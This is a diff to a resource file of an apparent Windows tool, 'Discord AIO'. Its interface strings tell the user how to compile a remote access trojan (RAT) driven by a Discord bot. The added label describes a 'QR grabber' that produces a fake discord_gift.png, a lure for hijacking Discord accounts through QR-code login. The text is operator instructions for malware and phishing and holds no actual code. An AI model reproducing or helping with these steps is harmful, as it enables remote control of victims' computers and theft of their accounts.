@@ -852,7 +852,7 @@
   </metadata>
   <data name="label41.Text" xml:space="preserve">
     <value>1. Create discord bot, add it to your server (with administrator privileges).
-2. Install python3.
+2. Install python3 (3.10.3 32-Bit!!!).
 3. Click install button.
 4. Insert discord bot token and press Insert button.
 5. Click compile rat button.
@@ -862,6 +862,16 @@
 
 Commands are on our discord server.
 If you cannot compile RAT, uninstall enum34 package with &lt;py -m pip uninstall enum34&gt;</value>
+  </data>
+  <data name="label51.Text" xml:space="preserve">
+    <value>1. Install python3 (3.10.3).
+2. Install Google Chrome.
+3. Click install button.
+4. Click start QR grabber button.
+5. Go to your desktop and take &lt; discord_gift.png &gt; from there.
+
+QR code is active for ~2 minutes.
+If desktop image did not appear or is not working, try to take &lt; discord_gift.png &gt; from ('AppData/Discord AIO/QRGrabber').</value>
   </data>
   <data name="$this.Icon" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
     <value>
